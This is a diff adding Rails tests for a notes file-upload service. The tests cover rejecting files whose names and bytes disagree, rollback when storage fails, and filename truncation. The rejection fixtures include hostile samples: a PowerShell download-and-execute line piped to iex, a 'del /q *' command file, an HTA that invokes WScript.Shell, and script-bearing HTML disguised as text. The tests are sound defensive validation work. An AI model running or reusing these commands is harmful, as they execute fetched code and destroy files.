@@ -49,6 +49,55 @@ class Notes::FilesServiceTest < ActiveSupport::TestCase
     end
   end
 
+  # The ruling after the first review: the stored type and the name a person
+  # downloads the file under must agree, markup behind a byte order mark is
+  # markup, and UTF-16 is not UTF-8. Each with real bytes, through the service.
+  test "a file whose name and bytes disagree refuses the note, and nothing is stored" do
+    mark = "\xEF\xBB\xBF".b
+    files = {
+      "page.txt" => mark + HTML.b, "drawing.txt" => mark + file_fixture("tiny.svg").binread,
+      "utf16.txt" => "\xFF\xFE".b + "<html><script>alert(1)</script></html>".encode("UTF-16LE").b,
+      "run.hta" => "<script>new ActiveXObject('WScript.Shell')</script>", "setup.ps1" => "Invoke-WebRequest https://example.com | iex\n",
+      "start.cmd" => "del /q *\r\n", "report.docm" => office_bytes("docx"), "shot.txt" => file_fixture("tiny.png").binread, "notes.pdf" => "Just text.\n"
+    }
+
+    files.each do |name, bytes|
+      assert_no_difference [ -> { Notes::Thread.count }, -> { Notes::Message.count }, -> { ActiveStorage::Blob.count }, -> { ActiveStorage::Attachment.count } ], name do
+        result = as(users(:two)) { Notes::Start.call(@page, body: "With #{name}", files: [ png, note_upload(bytes, name) ]) }
+        assert_match(/\A#{Regexp.escape(name)}: /, result.errors.sole, name)
+      end
+    end
+  end
+
+  # A save behind `attach` that fails is an ordinary refusal: the note and
+  # the files attached before it go with the transaction.
+  test "a file that cannot be written fails the note whole, with a sentence" do
+    calls = 0
+    failing = lambda do |message, uploads|
+      Array(uploads).all? do |upload|
+        (calls += 1) == 1 && message.files.attach(io: upload.tempfile, filename: "first.png", content_type: "image/png", identify: false)
+      end
+    end
+    thread = as(users(:two)) { Notes::Start.call(@page, body: "Start") }.record
+
+    with_singleton_override(Notes::Files, :attach, failing) do
+      assert_no_difference [ -> { Notes::Thread.count }, -> { Notes::Message.count }, -> { ActiveStorage::Blob.count }, -> { Audit::Event.count }, -> { Notes::Delivery.count } ] do
+        started = as(users(:two)) { Notes::Start.call(@page, body: "For @[#{users(:reader).id}]", files: [ png, pdf ]) }
+        assert_equal [ "The files could not be stored. Nothing was saved: try again." ], started.errors
+        calls = 0
+        replied = as(users(:reader)) { Notes::Reply.call(thread, body: "A reply", files: [ png, pdf ]) }
+        assert_equal [ "The files could not be stored. Nothing was saved: try again." ], replied.errors
+      end
+    end
+  end
+
+  test "a long name is stored at 255 characters with its ending" do
+    result = as(users(:two)) { Notes::Start.call(@page, body: "Long", files: [ fixture_upload("tiny.png", name: "#{"n" * 150}.png").tap { |upload| upload.define_singleton_method(:original_filename) { "#{"n" * 400}.png" } } ]) }
+
+    assert result.ok?, result.errors.to_sentence
+    assert_equal "#{"n" * 251}.png", result.record.first_message.files.sole.filename.to_s
+  end
+
   test "what the text gets wrong and what a file gets wrong are both said" do
     result = as(users(:two)) { Notes::Start.call(@page, body: "", files: [ svg ]) }
 
